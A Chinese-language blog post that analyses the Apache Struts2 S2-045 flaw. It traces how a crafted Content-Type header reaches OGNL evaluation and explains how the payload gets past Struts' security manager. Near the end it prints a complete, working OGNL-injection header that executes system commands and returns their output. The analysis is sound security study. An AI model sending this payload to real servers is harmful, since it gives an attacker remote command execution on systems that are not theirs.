---
layout: post
title: "s2-045漏洞解析"
---

#### 0x00 前言####

漏洞已经出来很长时间了，但是一直放着没有分析过，最近看到freebuf上的文章，所以也手痒马上来分析一波(主要是为了摸清触发的流程，以及payload如何构造的)，从以下2个思路进行分析

- 漏洞触发流程
- payload如何工作

调试使用的war包是地址为： https://archive.apache.org/dist/struts/2.5.1/struts-2.5.1-apps.zip (版本为struts2-2.5.1)

#### 0x01 漏洞触发流程 ####

我们先从入口出发，用户发起的请求会通过`WEB-INF/web.xml`中定义的过滤器

![s2-045]({{ '/images/201803/s2-045_1_1.png' | prepend: site.baseurl }})

`org.apache.struts2.dispatcher.filter.StrutsPrepareFilter`就是我们的入口，在`dofileter`中请求会进入`this.prepare.wrapRequest`(org.apache.struts2.dispatcher.PrepareOperations)

![s2-045]({{ '/images/201803/s2-045_1_2.png' | prepend: site.baseurl }})

接着请求会通过`this.dispatcher.wrapRequest`(org.apache.struts2.dispatcher.Dispatcher)开始分发我们的请求

![s2-045]({{ '/images/201803/s2-045_1_3.png' | prepend: site.baseurl }})

在这里会先获取用户的`content_type`(这是我们所能控制的),接着判断我们的`content-type`中是否包含"multipart/form-data",包含就会进入`jakarta`处理流程，接着会进入`MultiPartRequestWrapper`

![s2-045]({{ '/images/201803/s2-045_1_4.png' | prepend: site.baseurl }})

首先会进入`this.multi.parse`(org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest)解析我们的请求

![s2-045]({{ '/images/201803/s2-045_1_5.png' | prepend: site.baseurl }})

在该函数中会产生异常，通过`buildErrorMessage`进行错误信息解析

![s2-045]({{ '/images/201803/s2-045_1_6.png' | prepend: site.baseurl }})

该函数会返回`LocalizedTextUtil.findText`(com.opensymphony.xwork2.util.LocalizedTextUtil)(有些文章跟踪到这里就结束了)，此时函数的参数中`e.getMessage()`其中就包含我们的异常的Content-Type也就是我们的payload

![s2-045]({{ '/images/201803/s2-045_1_7.png' | prepend: site.baseurl }})

会调用原始的`findText`,参数`defaultMessage`包含着我们的`payload`

![s2-045]({{ '/images/201803/s2-045_1_8.png' | prepend: site.baseurl }})

调用`getDefaultMessage`函数

![s2-045]({{ '/images/201803/s2-045_1_9.png' | prepend: site.baseurl }})

最终我们来到了漏洞函数`TextParseUtil.translateVariables`,通过`buildMessageFormat`调用

![s2-045]({{ '/images/201803/s2-045_1_10.png' | prepend: site.baseurl }})

通过`parse.evaluate`进行`ognl`表达式的识别和执行

![s2-045]({{ '/images/201803/s2-045_1_11.png' | prepend: site.baseurl }})

最后再跟入，会发现调用哪个`evaluator.evaluate(var)`，这个就是执行ognl表达式的关键，我们的payload被正确识别出来在var变量中

![s2-045]({{ '/images/201803/s2-045_1_12.png' | prepend: site.baseurl }})

到这里我们的`payload`经历各种函数的调用来到了这里，最终触发漏洞达到命令执行

#### 0x02 payload是如何构造的 ####

虽然知道ognl表达式是在哪里执行的，但是没有接触过所以看到poc也不明白都是些什么，还好通过ide可以直接使用该接口，就尝试了一些语句的执行

![s2-045]({{ '/images/201803/s2-045_2_1.png' | prepend: site.baseurl }})

还可以使用括号(表示一个语句)和.(拼接)来执行多个语句

![s2-045]({{ '/images/201803/s2-045_2_2.png' | prepend: site.baseurl }})

测试到这里，就想看看能弹计算器么...

![s2-045]({{ '/images/201803/s2-045_2_3.png' | prepend: site.baseurl }})

结果悲催的发现失败了，后来才知道这个`SecurityMemberAccess`是struts2的安全管理器，就是防止执行系统命令，对非法字符进行了黑名单校验，通过freebuf的[文章](http://www.freebuf.com/vuls/165488.html)(有详细的poc分析，以及绕过的简单分析)了解到细节，有兴趣的可以去看看

最终就是通过`_memberAccess`利用`DefaultMemberAccess`对象覆盖`SecurityMemberAccess`对象

最后自己整理的直接执行的ognl表达式的payload(这个是在IDE里面直接执行的)

	(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='\"calc\"').(#cmds={'cmd.exe','/c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())

最终成熟的`payload`为(也是网上流传最广的一个)

	Content-Type:"%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"pwd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=newjava.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

#### 总结： ####

通过IDE很方便的动态调试struts2，清晰的跟踪整个漏洞的流程，了解了用户请求的基本流程以及命令为何执行，同时也了解了基本的ognl表达式，清楚的了解一些poc构造(不会看的很懵)。

ps:也是第一次分析，写的有点流水帐 :)

参考：

http://www.freebuf.com/vuls/165488.html
